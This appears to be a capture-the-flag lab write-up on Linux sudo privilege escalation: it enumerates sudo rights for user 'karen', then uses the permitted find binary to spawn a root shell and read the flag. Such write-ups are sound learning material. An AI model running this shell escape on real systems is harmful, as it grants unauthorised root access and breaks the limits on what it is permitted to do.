# Sudo Privilege Escalation

## Step 1: User & Permission Enumeration

First, identify the current user and check which commands can be executed with sudo privileges.

```bash
whoami
id
sudo -l
```

## Step 2: Identify Sudo Misconfiguration

The `sudo -l` output shows that user `karen` can run three programs as root without a password.

```text
(ALL) NOPASSWD: /usr/bin/find
(ALL) NOPASSWD: /usr/bin/less
(ALL) NOPASSWD: /usr/bin/nano
```

**Hint:** Some programs can be abused to escape into a root shell when they are allowed to run with sudo.

## Step 3: Exploit Sudo Find

Use the permitted `find` binary to execute a shell with root privileges.

```bash
sudo find . -exec /bin/sh \; -quit
```

Verify the current privileges:

```bash
id
```

## Step 4: Find & Read the Flag

Once root access is obtained, check the root directory and search for the flag file.

```bash
ls -la /root
find / -name "flag*" -type f 2>/dev/null
cat /path/flag.txt
```

## Technique

- **Category:** Linux Privilege Escalation
- **Method:** Sudo Misconfiguration
- **Vulnerable Binary:** `/usr/bin/find`
- **Result:** Root Access
